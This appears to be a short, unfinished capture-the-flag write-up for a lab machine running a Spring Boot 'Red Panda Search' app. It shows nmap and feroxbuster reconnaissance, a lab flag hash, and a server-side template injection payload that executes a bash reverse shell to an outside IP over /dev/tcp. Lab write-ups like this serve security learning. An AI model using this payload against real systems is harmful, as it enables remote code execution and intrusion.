## Table of Contents

- [Page Technology](#page\technology)
- [Enumeration](#enumeration)
- [Vulnerability](#vulnerability)

**Nmap #1**
```bash
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```
**Nmap #2**
```
Nmap scan report for 10.10.11.170
Host is up (0.045s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Fri, 20 Oct 2023 08:36:33 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Fri, 20 Oct 2023 08:36:33 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Fri, 20 Oct 2023 08:36:33 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-title: Red Panda Search | Made with Spring Boot
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94%I=7%D=10/20%Time=65323C10%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;chars
SF:et=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Fri,\x2020\x20Oct\x2
SF:02023\x2008:36:33\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20ht
SF:ml>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x20
SF:\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"wood
SF:en_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://codep
SF:en\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"styles
SF:heet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"text/
SF:css\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x20
SF:with\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x20
SF:\x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20cla
SF:ss='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x20
SF:right'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20left'
SF:>\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\
SF:x20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20<
SF:/div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x20200\
SF:x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x20F
SF:ri,\x2020\x20Oct\x202023\x2008:36:33\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text
SF:/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x2043
SF:5\r\nDate:\x20Fri,\x2020\x20Oct\x202023\x2008:36:33\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>
SF:HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x
SF:20type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h
SF:1,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\
SF:x20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14p
SF:x;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{heig
SF:ht:1px;background-color:#525D76;border:none;}</style></head><body><h1>H
SF:TTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></htm
SF:l>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
7.94

# Page Technology
Java Spring Boot
# Enumeration 
```bash
feroxbuster -u http://machine_ip:8080/ -x pdf,java







```




# Vulnerability
SSTI
payload:
`*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('bash -i >& /dev/tcp/10.10.16.3/4242 0>&1').getInputStream())}`





user.txt
`d854ef94a77eddb02aeff3b7f5ad5a63`

